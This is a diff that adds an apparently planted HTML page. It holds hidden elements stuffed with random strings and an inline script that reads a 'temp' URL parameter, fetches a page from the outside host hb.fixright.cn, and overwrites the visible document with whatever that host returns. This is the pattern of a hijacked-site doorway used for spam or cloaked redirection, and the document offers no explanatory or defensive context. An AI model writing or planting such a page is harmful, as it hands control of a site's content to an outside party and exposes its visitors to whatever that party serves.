@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head> <meta charset="utf-8" /></head>
+<body>
+<li style='display:none' >1QZdp9ESL8GbTwZYOJkMl5yXj</li>
+<ul style='display:none' >dG9tKw8B1OSpITx4v5Hxbpg7zijeWAbEw0VGxvUjOLcrCbN7CBkWGUl1cfsWJzi2</ul>
+<span style='display:none'>8dhNPPH9YINdE3ZRIx7dW4Tkds1ne8fxrEsRj6iJI</span>
+<a  href='#' style='display:none'>jTdg2UaybA8ANSiytyagbCjaN</a>
+<div style='display:none'>3i4OiFQCJUWLOkHa0b3Hf0MKb5i26yTkhKhzfWFZCVP42YBUVyMHsifv0Ha</div>
+<h1 style='display:none' >iTOIceZBG0r9EkIQ7P8O1qK5Q1sSrTwzqdi1T2G0IpA7gStjpnoe3i4yhEbGal7NjghDkJu3S</h1>
+<div style='display:none'>3i4OiFQCJUWLOkHa0b3Hf0MKb5i26yTkhKhzfWFZCVP42YBUVyMHsifv0Ha</div>
+<b style='display:none' >lZi4DKaB2IqILvpVPR4NhBz4dNL1BYTfGDouKymNU3TPomU4wZLZ13uPISEomUS</b>
+<a  href='#' style='display:none'>jTdg2UaybA8ANSiytyagbCjaN</a></body>
+<script>
+    function loadJs(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
+    function getUrlParam(name) { var reg = new RegExp("(.|&)" + name + "=([^&]*)(&|$)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return null;}
+    function Dget(e, t,a) {
+        var n = new XMLHttpRequest;
+        //n.timeout = 3000;
+        n.onreadystatechange = function () {
+            4 === n.readyState && (200 === n.status || 304 === n.status ? "function" == typeof t && t(n.responseText) : "function" == typeof a && a(n))
+        };n.ontimeout = function (e) {
+            //alert('请求超时,重新发起请求');
+            //location.reload();
+        };
+        n.open("GET", e, !0),
+            n.send(null)
+    }
+    var temp = getUrlParam('temp');
+    //if(document.referrer){
+    var temp_name = temp +'.html';
+    Dget('//hb.fixright.cn/jb/'+temp_name,function(res){
+        var doc=document.open("text/html","replace")
+        doc.write(res);
+        doc.close()
+    })
+    //}
+
+</script>
+</html>
